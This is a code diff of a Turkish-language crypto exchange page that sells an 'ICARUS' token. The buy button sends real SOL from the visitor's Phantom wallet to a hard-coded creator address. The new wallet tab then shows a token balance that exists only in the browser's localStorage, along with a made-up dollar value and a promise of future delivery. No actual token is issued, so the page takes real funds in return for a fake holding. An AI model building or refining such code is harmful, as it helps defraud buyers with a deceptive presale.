@@ -46,6 +46,7 @@
         <div class="hidden md:flex space-x-8 font-semibold text-sm text-gray-500" id="mainNav">
             <button onclick="switchTab('marketsPage')" class="hover:text-black transition focus:outline-none">Piyasalar</button>
             <button onclick="switchTab('dashboardPage')" class="hover:text-black transition focus:outline-none">Kolay Al/Sat</button>
+            <button onclick="switchTab('walletPage')" class="hover:text-black transition focus:outline-none text-[#8DC63F] font-bold">Cüzdan</button>
         </div>
         <div class="flex items-center space-x-4">
             <button id="connectWalletBtn" class="bg-gray-100 text-gray-700 hover:bg-gray-200 font-bold py-2 px-4 rounded border border-gray-300 text-sm transition flex items-center">
@@ -284,7 +285,6 @@
                         </button>
                     </div>
                 </div>
-
             </div>
 
             <div class="bg-white rounded-xl shadow-sm border border-gray-200 p-6 flex flex-col h-fit sticky top-24">
@@ -337,6 +337,34 @@
         </div>
     </div>
 
+    <div id="walletPage" class="hidden min-h-[90vh] flex-col container mx-auto px-4 py-10">
+        <h2 class="text-3xl font-extrabold mb-8 text-gray-800 text-center">Varlıklarım</h2>
+        <div class="max-w-2xl mx-auto w-full bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden">
+            <div class="p-6 border-b border-gray-100 bg-gray-50 flex justify-between items-center">
+                <span class="text-gray-500 font-bold uppercase tracking-wider text-sm">Tahmini Bakiye</span>
+                <span class="text-2xl font-extrabold text-gray-900">$<span id="usdEquivalent">0.00</span></span>
+            </div>
+            <div class="p-2">
+                <div class="flex items-center justify-between p-4 hover:bg-gray-50 rounded-xl transition">
+                    <div class="flex items-center">
+                        <div class="w-10 h-10 rounded-full bg-[#8DC63F] text-white flex items-center justify-center font-bold text-lg mr-4 shadow-sm">ICR</div>
+                        <div>
+                            <h4 class="font-bold text-gray-900">ICARUS</h4>
+                            <p class="text-xs text-gray-500 font-medium">Icarus Protocol</p>
+                        </div>
+                    </div>
+                    <div class="text-right">
+                        <h4 class="font-extrabold text-gray-900 text-lg"><span id="walletIcrBalance">0</span></h4>
+                        <p class="text-xs text-gray-500 font-medium">ICR</p>
+                    </div>
+                </div>
+            </div>
+            <div class="px-6 py-4 bg-green-50 border-t border-green-100 text-xs text-green-700 font-medium">
+                <i class="fas fa-info-circle mr-1"></i> Başarıyla satın aldığınız ICARUS tokenları yukarıda listelenmektedir. Akıllı kontrat dağıtımı başladığında bu tokenlar otomatik olarak Phantom cüzdanınıza yatırılacaktır.
+            </div>
+        </div>
+    </div>
+
     <script>
         const KREATOR_WALLET = "1d216R3J9LLt34NgzitsB713kTQQgHTY1kF2wEAi6gm"; 
 
@@ -345,6 +373,7 @@
             document.getElementById('landingPage').style.display = 'none';
             document.getElementById('dashboardPage').style.display = 'none';
             document.getElementById('marketsPage').style.display = 'none';
+            document.getElementById('walletPage').style.display = 'none';
             
             const activeTab = document.getElementById(tabId);
             activeTab.style.display = 'flex';
@@ -353,8 +382,18 @@
             activeTab.classList.add('fade-in');
 
             if(tabId === 'marketsPage') { loadMarketChart('BTCUSDT'); fetchLivePrices(); }
-            window.scrollTo(0, 0); // Üste kaydır
+            if(tabId === 'walletPage') { updateWalletUI(); }
+            window.scrollTo(0, 0); 
         }
+
+        // Cüzdan Arayüzü Güncelleme
+        function updateWalletUI() {
+            let balance = parseInt(localStorage.getItem('icr_balance')) || 0;
+            document.getElementById('walletIcrBalance').innerText = balance.toLocaleString('en-US');
+            // Görsel amaçlı tahmini bir dolar değeri (Örn: 1 ICR = $0.001)
+            document.getElementById('usdEquivalent').innerText = (balance * 0.001).toFixed(2);
+        }
+        updateWalletUI();
 
         // Kopyalama İşlemleri
         function toggleManualTransfer() { document.getElementById('manualTransferBox').classList.toggle('hidden'); }
@@ -370,11 +409,10 @@
             alert("✅ Referans linkiniz başarıyla kopyalandı!\nArkadaşlarınızla paylaşmaya hazırsınız.");
         }
 
-        // Canlı Piyasa ve Grafik (Binance API) Güncellenmiş Hali
+        // Canlı Piyasa ve Grafik (Binance API) - Beyaz Ekran Sorunu Düzeltildi
         const symbolNames = { "BTCUSDT":"Bitcoin", "ETHUSDT":"Ethereum", "SOLUSDT":"Solana", "XRPUSDT":"Ripple", "DOGEUSDT":"Dogecoin", "AVAXUSDT":"Avalanche" };
         async function fetchLivePrices() {
             try {
-                // Tarayıcıların engellememesi için sembolleri özel bir formata (encodeURIComponent) çeviriyoruz
                 const symbols = encodeURIComponent('["BTCUSDT","ETHUSDT","SOLUSDT","XRPUSDT","DOGEUSDT","AVAXUSDT"]');
                 const url = `https://api.binance.com/api/v3/ticker/24hr?symbols=${symbols}`;
                 
@@ -413,10 +451,11 @@
             new TradingView.widget({ "autosize": true, "symbol": "BINANCE:" + symbol, "interval": "60", "timezone": "Europe/Istanbul", "theme": "light", "style": "1", "locale": "tr", "enable_publishing": false, "backgroundColor": "#ffffff", "hide_top_toolbar": false, "container_id": "tv_dynamic_inner" });
         }
 
-        // Web3 Swap ve Solana Transferi
+        // Web3 Swap ve Solana Transferi Hesaplama
         const solInput = document.getElementById('solInput'), icrOutput = document.getElementById('icrOutput');
         solInput.addEventListener('input', () => {
-            const val = parseFloat(solInput.value) || 0; icrOutput.value = Math.floor(val * 100000).toLocaleString('en-US');
+            const val = parseFloat(solInput.value) || 0; 
+            icrOutput.value = Math.floor(val * 100000).toLocaleString('en-US');
         });
 
         let userPublicKey = null;
@@ -434,27 +473,50 @@
             } else { alert("Phantom Cüzdan kurun!"); }
         });
 
+        // TRANSFER VE BAKİYE KAYDETME İŞLEMİ
         buyBtn.addEventListener('click', async () => {
             if (!userPublicKey) return;
             const amount = parseFloat(solInput.value);
-            if (userPublicKey.toString() === KREATOR_WALLET) { txStatus.innerHTML = "<span class='text-red-600'>HATA: Kendinize gönderemezsiniz.</span>"; return; }
+            
+            if (userPublicKey.toString() === KREATOR_WALLET) { 
+                txStatus.innerHTML = "<span class='text-red-600 font-bold'>HATA: Kendi cüzdanınıza transfer yapamazsınız. <br>Lütfen alıcı cüzdandan farklı bir hesap bağlayın.</span>"; 
+                return; 
+            }
 
             try {
-                buyBtn.innerText = "ONAY BEKLENİYOR..."; buyBtn.classList.add('opacity-75', 'cursor-wait');
+                buyBtn.innerText = "CÜZDANDAN ONAYLAYIN..."; 
+                buyBtn.classList.add('opacity-75', 'cursor-wait');
+                txStatus.innerHTML = "<span class='text-gray-500'>Phantom cüzdanınızdan işleme onay verin...</span>";
+
                 const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({ fromPubkey: userPublicKey, toPubkey: new solanaWeb3.PublicKey(KREATOR_WALLET), lamports: Math.round(amount * solanaWeb3.LAMPORTS_PER_SOL) })
                 );
                 const { blockhash } = await connection.getLatestBlockhash('confirmed');
-                transaction.recentBlockhash = blockhash; transaction.feePayer = userPublicKey;
+                transaction.recentBlockhash = blockhash; 
+                transaction.feePayer = userPublicKey;
+                
+                // Gerçek Solana Transferi
                 const { signature } = await window.solana.signAndSendTransaction(transaction);
+                
                 txStatus.innerHTML = "<span class='text-blue-500'>Ağa İşleniyor...</span>";
                 await connection.confirmTransaction(signature, 'confirmed');
-                txStatus.innerHTML = "<span class='text-green-600 font-bold'>✅ BAŞARILI!</span>";
-                buyBtn.innerText = "YENİDEN SATIN AL"; buyBtn.classList.remove('opacity-75', 'cursor-wait');
+                
+                // İşlem Başarılıysa
+                txStatus.innerHTML = "<span class='text-green-600 font-bold'>✅ İŞLEM BAŞARILI! Cüzdan sekmesini kontrol edin.</span>";
+                buyBtn.innerText = "YENİDEN SATIN AL"; 
+                buyBtn.classList.remove('opacity-75', 'cursor-wait');
+
+                // Bakiyeye Ekle ve Kaydet
+                const boughtIcr = parseInt(icrOutput.value.replace(/,/g, ''));
+                let currentBalance = parseInt(localStorage.getItem('icr_balance')) || 0;
+                localStorage.setItem('icr_balance', currentBalance + boughtIcr);
+                updateWalletUI();
+
             } catch (err) {
-                buyBtn.innerText = "ICARUS SATIN AL"; buyBtn.classList.remove('opacity-75', 'cursor-wait');
-                txStatus.innerHTML = `<span class='text-red-600 font-bold'>❌ İŞLEM BAŞARISIZ</span>`;
+                buyBtn.innerText = "ICARUS SATIN AL"; 
+                buyBtn.classList.remove('opacity-75', 'cursor-wait');
+                txStatus.innerHTML = `<span class='text-red-600 font-bold'>❌ İŞLEM BAŞARISIZ <br> (Yetersiz bakiye veya iptal edildi)</span>`;
             }
         });
     </script>
